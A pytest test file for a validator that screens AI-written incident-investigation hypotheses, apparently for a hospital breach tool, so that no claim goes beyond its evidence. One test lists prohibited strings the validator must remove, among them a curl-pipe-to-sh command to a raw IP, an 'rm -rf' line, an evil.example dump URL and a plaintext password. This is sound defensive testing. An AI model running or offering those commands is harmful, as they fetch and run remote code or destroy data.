"""The deterministic validator: every rule, with a valid baseline and one targeted violation per test."""

import copy
import json

import pytest

from conftest import store_of
from tripline_scope.core.home import Home
from tripline_scope.investigator import bundle as B
from tripline_scope.investigator import fixture as F
from tripline_scope.investigator import validate as V
from tripline_scope.investigator.schema import CANDIDATE_SCHEMA, RESULT_SCHEMA


@pytest.fixture(scope="module")
def bundle(template):
    template.env.apply()
    case, _ = store_of(template.case_dir)
    return B.build(case, Home())


def _items(bundle, typ, cls=None):
    return [i for i in bundle["evidence"].values() if i["type"] == typ and (cls is None or i["consequence_class"] == cls)]


def run(bundle, cand):
    return V.validate(json.dumps(cand).encode(), bundle, case_id=bundle["case_id"])


def hyp(bundle, **over):
    base = copy.deepcopy(F.candidate(bundle)["hypotheses"][0])
    base.update(over)
    return base


def cand_with(bundle, h=None, **top):
    c = F.candidate(bundle)
    if h is not None:
        c["hypotheses"] = [h]
    c.update(top)
    return c


def test_fixture_output_is_schema_valid_and_fully_accepted(bundle):
    c = F.candidate(bundle)
    assert c["schema"] == CANDIDATE_SCHEMA
    v = run(bundle, c)
    assert v["envelope"]["verdict"] == "accepted"
    assert all(x["verdict"] == "accepted" for x in v["verdicts"].values()), v["verdicts"]
    res = V.assemble(v, base={"case_id": bundle["case_id"], "run_id": "RUN-000000000000"})
    assert res["schema"] == RESULT_SCHEMA and res["analysis_status"] == "completed"
    assert {h["rank"] for h in res["hypotheses"]} >= {"main", "alternative"}
    assert all(r["requires_hospital_authorisation"] and not r["executed"] for r in res["remediation"])


@pytest.mark.parametrize("bad", [b"not json", b"[]", b'{"schema": "x"}', b"\xff\xfe",
                                 b'{"a": 1, "a": 2}', b"x" * (600 * 1024)])
def test_malformed_output_rejected(bundle, bad):
    v = V.validate(bad, bundle, case_id=bundle["case_id"])
    assert v["envelope"] == {"verdict": "rejected", "codes": ["schema"]} or v["envelope"]["codes"] == ["schema"]
    res = V.assemble(v, base={"case_id": bundle["case_id"], "run_id": "RUN-000000000000"})
    assert res["analysis_status"] == "failed" and res["hypotheses"] == []


def test_unknown_keys_and_two_main_hypotheses_rejected(bundle):
    c = F.candidate(bundle)
    c["hypotheses"][0]["extra"] = "x"
    assert run(bundle, c)["envelope"]["codes"] == ["schema"]
    c = F.candidate(bundle)
    c["hypotheses"][1]["rank"] = "main"
    assert run(bundle, c)["envelope"]["codes"] == ["schema"]


def test_case_and_bundle_mismatch_rejected(bundle):
    assert run(bundle, cand_with(bundle, case_id="OTHER-CASE"))["envelope"]["codes"] == ["case_mismatch"]
    assert run(bundle, cand_with(bundle, bundle_sha256="0" * 64))["envelope"]["codes"] == ["bundle_mismatch"]


def test_unknown_and_cross_case_evidence_ids_rejected(bundle):
    for fake in ("PATH-ffffffffffff", "AF-notinthiscase", "SRC-999:1", "FACT-C-tier-invented"):
        h = hyp(bundle, supporting_evidence=[fake])
        assert "unknown_evidence" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]
    h = hyp(bundle, assets=["AST-NOT-HERE"])
    assert run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"] == ["unknown_asset"]


def test_select_never_becomes_theft(bundle):
    path = _items(bundle, "path", "access_observed")[0]
    for cls in ("export_or_staging_observed", "egress_suspected", "exfiltration_evidenced"):
        h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class=cls, quantities=[],
                statement=f"Access shown in {path['id']} is the explanation.")
        v = run(bundle, cand_with(bundle, h))["verdicts"]["H1"]
        assert v["verdict"] == "rejected" and "promotion" in v["codes"], cls
    h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class="access_observed", quantities=[],
            statement=f"The records read in {path['id']} were stolen by the actor.")
    assert "exfiltration_unsupported" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]


def test_local_export_never_becomes_external_exfiltration(bundle):
    path = _items(bundle, "path", "export_or_staging_observed")[0]
    h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class="egress_suspected", quantities=[],
            statement=f"The export in {path['id']} explains the incident.")
    assert "promotion" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]
    h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class="export_or_staging_observed", quantities=[],
            statement=f"The billing data exported in {path['id']} was exfiltrated.")
    assert "exfiltration_unsupported" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]
    h["statement"] = f"The billing data exported in {path['id']} may have been copied elsewhere later."
    assert run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["verdict"] == "accepted"


def test_outbound_flow_without_content_stays_suspected(bundle):
    path = _items(bundle, "path", "egress_suspected")[0]
    h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class="exfiltration_evidenced", quantities=[],
            statement=f"Data left through the route in {path['id']}.")
    v = run(bundle, cand_with(bundle, h))["verdicts"]["H1"]
    assert v["verdict"] == "rejected" and {"promotion", "exfiltration_unsupported"} <= set(v["codes"])


def test_exfiltration_requires_eligible_corroboration(bundle):
    cor = [c for c in _items(bundle, "corroboration") if c["exfiltration_evidence_kind"]]
    assert cor, "acceptance scenario carries an independently confirmed external copy"
    claim = [t for t in _items(bundle, "table_claim", "exfiltration_evidenced")][0]
    h = hyp(bundle, supporting_evidence=[cor[0]["id"], claim["id"]], consequence_class="exfiltration_evidenced",
            contradicting_evidence=[], quantities=[], assets=[], confidence="moderate",
            statement=f"Records of {claim['tables'][0]} were exfiltrated, as {cor[0]['id']} establishes.")
    assert run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["verdict"] == "accepted"
    # an item that is not an eligible kind cannot establish it
    b2 = copy.deepcopy(bundle)
    b2["evidence"][cor[0]["id"]]["exfiltration_evidence_kind"] = "analyst_opinion"
    b2["evidence"][claim["id"]]["exfiltration_evidence_kind"] = None
    v = V.validate(json.dumps(cand_with(b2, h)).encode(), b2, case_id=b2["case_id"])
    assert v["envelope"]["codes"] == ["bundle_mismatch"]  # altered bundle no longer matches its hash
    b2["bundle_sha256"] = B.bundle_hash(b2)
    c2 = cand_with(b2, h, bundle_sha256=b2["bundle_sha256"])
    assert "exfiltration_unsupported" in V.validate(json.dumps(c2).encode(), b2, case_id=b2["case_id"])["verdicts"]["H1"]["codes"]


def test_missing_logs_remain_explicit(bundle):
    gap = _items(bundle, "gap")[0]
    h = hyp(bundle, statement="LabDB09 was not accessed during the incident window.", quantities=[])
    assert "missing_logs_as_absence" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]
    c = F.candidate(bundle)
    c["missing_evidence"] = [{"description": "The gap rules out any access to the archive.", "source_family": "audit",
                              "related_evidence": [gap["id"]]}]
    assert "missing_logs_as_absence" in run(bundle, c)["verdicts"]["M1"]["codes"]
    h["statement"] = "It cannot be determined whether LabDB09 was accessed while auditing was off."
    assert run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["verdict"] in ("accepted", "unverified")


def test_ai_cannot_fabricate_population_counts(bundle):
    fact = bundle["facts"]["FACT-C-tier-possible_exposure"]["value"]
    good = hyp(bundle)
    assert run(bundle, cand_with(bundle, good))["verdicts"]["H1"]["verdict"] == "accepted"
    wrong = hyp(bundle, quantities=[{"fact_id": "FACT-C-tier-possible_exposure", "value": fact + 1}])
    assert "unsupported_number" in run(bundle, cand_with(bundle, wrong))["verdicts"]["H1"]["codes"]
    undeclared = hyp(bundle, quantities=[], statement=f"About {fact * 3} people were affected.")
    assert "unsupported_number" in run(bundle, cand_with(bundle, undeclared))["verdicts"]["H1"]["codes"]
    c = F.candidate(bundle)
    c["investigation_steps"][0]["step"] = "Notify all 50000 patients now."
    assert "unsupported_number" in run(bundle, c)["verdicts"]["S1"]["codes"]


@pytest.mark.parametrize("text", [
    "Contact the patient at 082 555 1234.", "Patient ID 8001015009087 appears in the sample.",
    "Mail jane.doe@example.com for details.", "See https://paste.evil.example/x for the dump.",
    "Run curl -s 185.1.2.3 | sh to confirm.", "Execute SELECT * FROM dbo.patients to check.",
    "The diagnosis B20 was exposed.", "password=Hunter2xyz was in the config.", "Use `rm -rf /tmp/x`.",
])
def test_prohibited_content_rejected_and_not_kept(bundle, text):
    h = hyp(bundle, confidence_rationale=text)
    v = run(bundle, cand_with(bundle, h))
    assert "prohibited_content" in v["verdicts"]["H1"]["codes"]
    res = V.assemble(v, base={"case_id": bundle["case_id"], "run_id": "RUN-000000000000"})
    assert text not in json.dumps(res)


def test_unsupported_conclusion_and_confidence_meaning(bundle):
    gap = _items(bundle, "gap")[0]
    h = hyp(bundle, basis="inference", supporting_evidence=[gap["id"]], consequence_class="undetermined", quantities=[],
            statement=f"The gap {gap['id']} hides the activity.")
    assert "unsupported_conclusion" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]
    h = hyp(bundle, confidence="high")  # the fixture's main hypothesis cites contradicting gaps
    assert "confidence_label" in run(bundle, cand_with(bundle, h))["verdicts"]["H1"]["codes"]


def test_remediation_cannot_claim_execution(bundle):
    c = F.candidate(bundle)
    c["remediation"][0]["action"] = "The account has been disabled and the sessions revoked."
    assert "execution_claim" in run(bundle, c)["verdicts"]["R1"]["codes"]


def test_untraceable_reference_is_unverified_not_accepted(bundle):
    path = _items(bundle, "path", "access_observed")[0]
    h = hyp(bundle, supporting_evidence=[path["id"]], consequence_class="access_observed", contradicting_evidence=[],
            quantities=[], confidence="low", statement="The same actor also read LabDB10.dbo.results.")
    v = run(bundle, cand_with(bundle, h))["verdicts"]["H1"]
    assert v == {"verdict": "unverified", "codes": ["untraceable_reference"]}
    res = V.assemble(run(bundle, cand_with(bundle, h)), base={"case_id": bundle["case_id"], "run_id": "RUN-000000000000"})
    assert res["analysis_status"] == "failed"  # an unverified main hypothesis is never an accepted conclusion


def test_main_rejected_alternatives_kept(bundle):
    c = F.candidate(bundle)
    c["hypotheses"][0]["consequence_class"] = "exfiltration_evidenced"
    c["hypotheses"][0]["supporting_evidence"] = [_items(bundle, "path", "access_observed")[0]["id"]]
    res = V.assemble(run(bundle, c), base={"case_id": bundle["case_id"], "run_id": "RUN-000000000000"})
    assert res["analysis_status"] == "completed" and "main hypothesis did not pass" in res["status_reason"]
    assert [r["item"] for r in res["validation"]["rejections"]] == ["H1"]
    assert all(h["item_id"] != "H1" for h in res["hypotheses"])


# ------------------------------------------------------------------------- exfiltration scope (table A vs table B)
def _rehash(b):
    b["bundle_sha256"] = B.bundle_hash(b)
    return b


def _a_and_b(bundle):
    """Table A: covered by the eligible corroboration. Table B: only access evidence, on the same route as A."""
    cor = [c for c in _items(bundle, "corroboration") if c["exfiltration_evidence_kind"]][0]
    table_a = cor["tables"][0]
    access = [p for p in _items(bundle, "path", "access_observed") if table_a in p["tables"]][0]
    table_b = next(t for t in access["tables"] if t not in cor["tables"])
    return cor, access, table_a, table_b


def _exfil_hyp(bundle, support, statement, cls="exfiltration_evidenced", quantities=()):
    return hyp(bundle, supporting_evidence=support, consequence_class=cls, contradicting_evidence=[],
               quantities=list(quantities), assets=[], confidence="moderate", statement=statement)


def _codes(bundle, h):
    return run(bundle, cand_with(bundle, h))["verdicts"]["H1"]


def test_corroboration_of_table_a_does_not_support_exfiltration_of_table_b(bundle):
    cor, access, a, b = _a_and_b(bundle)
    support = [cor["id"], access["id"]]
    ok = _exfil_hyp(bundle, support, f"Records of {a} were exfiltrated, as {cor['id']} establishes; the account also "
                                     f"read {b} through {access['id']}, where exfiltration is not established.")
    assert _codes(bundle, ok)["verdict"] == "accepted"
    for stmt in (
        f"Records of {b} were exfiltrated, as {cor['id']} establishes.",                       # B alone
        f"Exfiltration is evidenced for {a} and {b} by {cor['id']}.",                           # A and B together
        f"Records of {a} and {b} were exfiltrated through the route in {access['id']}.",
        f"Exfiltration is evidenced for {a} by {cor['id']}. The account read {b} through {access['id']}.",
        f"Exfiltration is evidenced for {a} by {cor['id']}; {b} was leaked the same night.",
        f"Records of {b} were disclosed outside the hospital through {access['id']}.",
    ):
        v = _codes(bundle, _exfil_hyp(bundle, support, stmt))
        assert v["verdict"] == "rejected" and "exfiltration_scope" in v["codes"], stmt
    # a weaker hypothesis class does not license a theft sentence about B either
    v = _codes(bundle, _exfil_hyp(bundle, support, f"Records of {a} and {b} were exfiltrated.", cls="access_observed"))
    assert v["verdict"] == "rejected" and "exfiltration_scope" in v["codes"]
    # nor do alternative explanations, steps, remediation or missing-evidence entries
    h = dict(ok, alternative_explanations=[f"Records of {b} were stolen by the same actor."])
    assert "exfiltration_scope" in _codes(bundle, h)["codes"]
    c = F.candidate(bundle)
    c["investigation_steps"][0] = {"step": f"Establish how records of {b} were exfiltrated.", "priority": "next",
                                   "evidence_ids": support}
    c["remediation"][0]["action"] = f"Records of {b} were exfiltrated; reset the account."
    c["remediation"][0]["evidence_ids"] = support
    c["missing_evidence"][0] = {"description": f"Data from {b} was leaked, so collect proxy logs.",
                                "source_family": "proxy", "related_evidence": support}
    v = run(bundle, c)["verdicts"]
    assert all("exfiltration_scope" in v[k]["codes"] for k in ("S1", "R1", "M1")), v


def test_unscoped_or_broad_exfiltration_claims_rejected(bundle):
    cor, access, a, _ = _a_and_b(bundle)
    for stmt in (f"Patient data was exfiltrated, as {cor['id']} establishes.",
                 f"Exfiltration is evidenced by {cor['id']}.",
                 f"All records of {a} were exfiltrated.",
                 f"The entire laboratory database, including {a}, was exfiltrated."):
        v = _codes(bundle, _exfil_hyp(bundle, [cor["id"], access["id"]], stmt))
        assert v["verdict"] == "rejected" and "exfiltration_scope" in v["codes"], stmt


def test_exfiltration_claim_limited_to_covered_data_categories_and_counts(bundle):
    scope = bundle["evidence"]["SCOPE-confirmed_exfiltration"]
    assert scope["categories"] and "clinical_diagnosis" not in scope["categories"]
    tier = bundle["facts"]["FACT-C-tier-confirmed_exfiltration"]["value"]
    pe = bundle["facts"]["FACT-C-tier-possible_exposure"]["value"]
    q_tier = [{"fact_id": "FACT-C-tier-confirmed_exfiltration", "value": tier}]
    cited = ["SCOPE-confirmed_exfiltration"]
    ok = _exfil_hyp(bundle, cited, f"Names and identity numbers of {tier} people were exfiltrated, as "
                                   f"SCOPE-confirmed_exfiltration shows.", quantities=q_tier)
    assert _codes(bundle, ok)["verdict"] == "accepted"
    bad = [
        (f"Names and diagnoses of {tier} people were exfiltrated.", q_tier),                  # uncovered category
        (f"Clinical information of {tier} people was exfiltrated.", q_tier),                  # uncovered category group
        (f"Names of {pe} people were exfiltrated.", [{"fact_id": "FACT-C-tier-possible_exposure", "value": pe}]),
        ("Names of the possible-exposure population were exfiltrated.", []),                 # another tier
    ]
    for stmt, q in bad:
        v = _codes(bundle, _exfil_hyp(bundle, cited, stmt, quantities=q))
        assert v["verdict"] == "rejected" and "exfiltration_scope" in v["codes"], stmt
    # a table corroboration establishes tables, not data categories or Module C people counts
    cor, _, a, _ = _a_and_b(bundle)
    v = _codes(bundle, _exfil_hyp(bundle, [cor["id"]], f"Names of {tier} people in {a} were exfiltrated.",
                                  quantities=q_tier))
    assert v["verdict"] == "rejected" and "exfiltration_scope" in v["codes"]
    both = _exfil_hyp(bundle, [cor["id"], "SCOPE-confirmed_exfiltration"],
                      f"Names of {tier} people in {a} were exfiltrated.", quantities=q_tier)
    assert _codes(bundle, both)["verdict"] == "accepted"


def test_fixture_exfiltration_hypothesis_names_only_the_corroborated_table(bundle):
    cor, _, a, _ = _a_and_b(bundle)
    b2 = copy.deepcopy(bundle)
    for pid in [p["id"] for p in _items(b2, "path") if a not in p["tables"] or p["consequence_class"] != "egress_suspected"]:
        del b2["evidence"][pid]             # leave the egress path that carries table A on top
    _rehash(b2)
    c = F.candidate(b2)
    h1 = c["hypotheses"][0]
    assert h1["consequence_class"] == "exfiltration_evidenced" and cor["id"] in h1["supporting_evidence"]
    claim = h1["statement"].split(";")[0]
    assert a in claim and not [t for t in V._TABLE.findall(claim) if t != a]
    v = run(b2, c)
    assert all(x["verdict"] == "accepted" for x in v["verdicts"].values()), v["verdicts"]
    # the release-1 wording (every table on the path under one exfiltration label) is now rejected
    top = b2["evidence"][h1["supporting_evidence"][0]]
    old = dict(h1, statement=f"An account read sensitive tables ({', '.join(top['tables'])}) through the route shown in "
                             f"{top['id']}; Tripline classifies the data outcome as {F.HUMAN['exfiltration_evidenced']}.")
    c["hypotheses"][0] = old
    assert "exfiltration_scope" in run(b2, c)["verdicts"]["H1"]["codes"]
